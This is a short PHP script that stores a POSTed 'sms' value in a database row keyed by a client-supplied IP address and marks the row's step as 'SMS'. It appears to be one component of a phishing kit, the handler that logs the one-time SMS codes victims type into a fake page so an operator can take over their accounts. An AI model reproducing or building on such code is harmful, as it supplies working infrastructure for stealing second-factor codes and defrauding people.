<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $sms       = $_POST['sms'];
    $ip  = $_POST['ip'];

    $data = [
        'sms'         => $sms,
        'step'          => 'SMS',
        'ip'            => $ip
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>